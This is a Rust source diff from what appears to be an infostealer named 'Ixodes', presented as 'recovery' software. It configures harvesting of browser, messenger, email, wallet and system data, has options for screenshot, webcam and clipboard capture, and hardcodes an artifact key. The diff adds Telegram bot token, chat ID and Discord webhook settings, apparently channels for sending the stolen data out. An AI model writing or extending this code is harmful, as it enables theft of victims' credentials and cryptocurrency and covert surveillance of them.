@@ -3,12 +3,7 @@ use base64::{Engine as _, engine::general_purpose::STANDARD};
 use once_cell::sync::Lazy;
 use std::{collections::HashSet, env, str::FromStr};
 use tracing::{info, warn};
-
-static DEFAULT_ALLOWED_CATEGORIES: Option<&[RecoveryCategory]> = Some(&[RecoveryCategory::Browsers, RecoveryCategory::Messengers, RecoveryCategory::EmailClients, RecoveryCategory::Wallets, RecoveryCategory::System, RecoveryCategory::Other]);
-static DEFAULT_ARTIFACT_KEY: Option<&str> = Some("CSAUKAXurU5lMsYkMn8kbjLfdDHtmQam8zNKJA7R6oQ=");
-static DEFAULT_CAPTURE_SCREENSHOTS: bool = false;
-static DEFAULT_CAPTURE_WEBCAMS: bool = false;
-static DEFAULT_CAPTURE_CLIPBOARD: bool = false;
+use crate::recovery::defaults::*;
 
 static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);
 
@@ -19,6 +14,9 @@ pub struct RecoveryControl {
     capture_screenshots: bool,
     capture_webcams: bool,
     capture_clipboard: bool,
+    telegram_token: Option<String>,
+    telegram_chat_id: Option<String>,
+    discord_webhook: Option<String>,
 }
 
 impl RecoveryControl {
@@ -47,6 +45,18 @@ impl RecoveryControl {
 
     pub fn capture_clipboard(&self) -> bool {
         self.capture_clipboard
+    }
+
+    pub fn telegram_token(&self) -> Option<&str> {
+        self.telegram_token.as_deref()
+    }
+
+    pub fn telegram_chat_id(&self) -> Option<&str> {
+        self.telegram_chat_id.as_deref()
+    }
+
+    pub fn discord_webhook(&self) -> Option<&str> {
+        self.discord_webhook.as_deref()
     }
 
     fn from_env() -> Self {
@@ -82,12 +92,25 @@ impl RecoveryControl {
         let capture_clipboard =
             parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
 
+        let telegram_token = env::var("IXODES_TELEGRAM_TOKEN")
+            .ok()
+            .or_else(|| DEFAULT_TELEGRAM_TOKEN.map(String::from));
+        let telegram_chat_id = env::var("IXODES_CHAT_ID")
+            .ok()
+            .or_else(|| DEFAULT_TELEGRAM_CHAT_ID.map(String::from));
+        let discord_webhook = env::var("IXODES_DISCORD_WEBHOOK")
+            .ok()
+            .or_else(|| DEFAULT_DISCORD_WEBHOOK.map(String::from));
+
         RecoveryControl {
             allowed_categories,
             artifact_key,
             capture_screenshots,
             capture_webcams,
             capture_clipboard,
+            telegram_token,
+            telegram_chat_id,
+            discord_webhook,
         }
     }
 }
